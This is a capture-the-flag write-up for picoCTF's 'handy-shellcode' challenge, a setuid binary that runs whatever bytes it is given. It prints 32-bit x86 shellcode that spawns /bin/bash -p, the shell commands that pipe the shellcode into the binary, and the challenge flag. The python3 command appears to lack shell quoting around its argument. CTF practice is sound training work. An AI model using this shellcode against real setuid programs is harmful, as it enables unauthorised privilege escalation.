# handy-shellcode
This [program](https://github.com/Xaplomian/DissimuloPicoCTFWriteUps/raw/master/Binary%20Exploitation/handy-shellcode/vuln) executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9 on the shell server. [Source](vuln.c). (50 points)

# Hint
You might be able to find some good shellcode online.

# Details
Completed: **During challenge**
Flag: `picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}`

# Solution
Shellcode is a series of opcodes that we can write into the stdin of a program, which we usually have to execute ourselves. However, the challenge does this for us in this line of code:
```((void (*)())buf)();```
This means that the program will treat that address in memory as a series of opcodes and run them.
Using the shellcode from [here](http://shell-storm.org/shellcode/files/shellcode-606.php) `"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"`. This shellcode will run a shell for us as the root user, since we are running a setuid binary, with permissions to also view the files in the directory, thus we can read flag.txt. Write this shellcode to a file in the home directory, and `cat` out the contents of that file, with a tack before the pipe to keep the stdin pipe open.
```bash
python3 -c print('\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80') > ~/shellcode.txt
cat ~/shellcode.txt - | ./vuln
ls
cat flag.txt
```
